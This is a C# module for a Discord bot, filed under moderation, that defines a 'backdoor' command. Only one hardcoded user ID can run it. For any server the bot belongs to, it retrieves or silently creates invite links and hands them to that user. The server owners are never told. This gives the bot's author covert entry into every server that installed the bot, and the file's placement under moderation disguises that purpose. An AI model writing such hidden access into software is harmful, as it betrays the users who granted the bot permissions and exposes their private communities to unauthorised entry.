using System;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace AlterBotNet.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task SendBackdoor(ulong guildId)
        {
            if (!(Context.User.Id == 260385529474842626))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;
            }

            if (this.Context.Client.Guilds.Count(x => x.Id == guildId) < 1)
            {
                await this.Context.Channel.SendMessageAsync(":x: I am not in a guild with id-" + guildId);
                return;
            }

            SocketGuild guild = this.Context.Client.Guilds.FirstOrDefault(x => x.Id == guildId);
                var invites = await guild.GetInvitesAsync();
                if (invites.Count < 1)
                {
                    try
                    {
                        await guild.TextChannels.First().CreateInviteAsync();
                    }
                    catch (Exception ex)
                    {
                        await this.Context.Channel.SendMessageAsync($":x: Creating an invite for guild {guild.Name} went wrong with error ``{ex.Message}``");
                        return;
                    }
                }
            invites = await guild.GetInvitesAsync();
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithAuthor($"Invites for guild {guild.Name}", this.Context.User.GetAvatarUrl());
            embed.WithColor(40, 200, 150);
            foreach (var current in invites)
                embed.AddField("Invite:", $"[invite]({current.Url})", true);

            await this.Context.Channel.SendMessageAsync("", false, embed.Build());
        }
    }
}
